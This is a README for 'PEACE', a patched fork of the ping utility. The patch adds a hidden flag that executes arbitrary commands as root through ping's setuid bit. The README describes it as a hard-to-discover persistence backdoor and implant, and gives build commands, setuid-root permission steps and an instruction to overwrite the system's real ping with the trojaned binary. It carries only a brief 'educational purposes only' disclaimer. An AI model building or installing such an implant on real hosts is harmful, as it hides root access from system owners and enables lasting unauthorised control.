# PEACE ☮
**P**ing **E**xecutes **A**ny **C**ommand **E**ntered

## About

Welcome to PEACE!

Peace is a very small patch to the well-known `ping` command, which leverages the utility's [setuid](https://en.wikipedia.org/wiki/Setuid) bit to execute arbitrary commands with root privileges. The result is a fully functional version of ping, with an additional flag (`-E`) used to enable command execution.

Because it's well-known that [ping requires the setuid bit to function](https://unix.stackexchange.com/questions/382771/why-does-ping-need-setuid-permission), and because versions of ping compiled with the PEACE patchset function just as expected, it's relatively unlikely that Peace's added functionality will be discovered. This makes Peace useful as a persistence mechanism (to maintain administrative access to a host), or as an implant for competitive security scrimmages.

As usual, this utility is for educational purposes only, and should not be used for any malicious purpose. PEACE is licensed under BSD-3.

## Building PEACE

This repository is a fork of [iputils](https://github.com/iputils/iputils), which hosts the original source code for ping and other assorted tools. 

To build PEACE from source, you'll need to install the following dependencies:

``` bash
$ apt install libcap-dev pkg-config libssl-dev python3 python3-pip ninja-build
```

Iputils uses [Meson](https://mesonbuild.com/) as their build system of choice. You can install it on your system using `pip3`:

``` bash 
$ pip3 install meson
```

Once these dependencies are satisfied, you can clone this repository and build Peace. After cloning, `cd` into the root of this repo and run the following:

``` bash
$ ./configure
$ make
```

Meson will build and link all of the utilities in this repository, including ping. You'll find the patched version of ping in the `builddir` directory.

Finally, ensure that the correct permissions and setuid bit are set on the newly produced `ping` binary:

``` bash 
$ cd builddir
$ chmod u+x ping
$ sudo chown root:root ping
$ sudo chmod +s ping # Add the setuid bit
```

Note that you may have to cross-compile Peace if your target is running a different architecture than the system you're building it on. 


## Installation

To install PEACE, you'll need to have some sort of administrator-level access to the target host.

After following the build instructions above, you can simply overwrite the system's copy of ping with your special, patched version:

``` bash
$ sudo mv ping `which ping`
```

## Demo

You can see a short demonstration of PEACE in use [here](https://cdn.ctis.me/file/ctisme-cdn/files-pub/video/projects/PEACE+-+Demo.mp4).
